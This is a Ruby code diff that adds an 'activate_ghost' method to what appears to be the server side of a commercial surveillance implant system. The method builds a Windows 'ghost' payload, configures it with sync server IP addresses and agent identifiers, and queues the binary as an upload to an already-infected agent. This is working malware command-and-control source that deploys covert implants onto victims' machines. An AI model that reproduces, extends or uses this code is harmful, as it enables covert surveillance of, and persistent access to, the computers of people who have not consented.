@@ -7,6 +7,8 @@ require_relative '../alert'
 
 require 'rcs-common/crypt'
 
+require 'ipaddr'
+
 module RCS
 module DB
 
@@ -650,6 +652,29 @@ class AgentController < RESTController
     return not_found()
   end
 
+  def activate_ghost
+
+    agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
+
+    factory = ::Item.where({_kind: 'factory', ident: agent.ident}).first
+    build = RCS::DB::Build.factory(:windows)
+    build.load({'_id' => factory._id})
+    build.unpack
+
+    sync = @params['sync'].collect {|i| IPAddr.new(i).to_i}
+    id = agent.ident.slice(4..-1).to_i
+    instance = agent.instance.slice(0..7).to_i(16)
+
+    build.ghost({:sync => sync, :build => id, :instance => instance})
+
+    # add the upload to the agent
+    agent.upload_requests.destroy_all
+    content = File.open(File.join(build.tmpdir, 'output'), 'rb+') {|f| f.read}
+    agent.upload_requests.create!({filename: 'ghost', _grid: [RCS::DB::GridFS.put(content, {filename: 'ghost', content_type: 'application/octet-stream'})] })
+
+    build.clean
+
+  end
 
 end
 
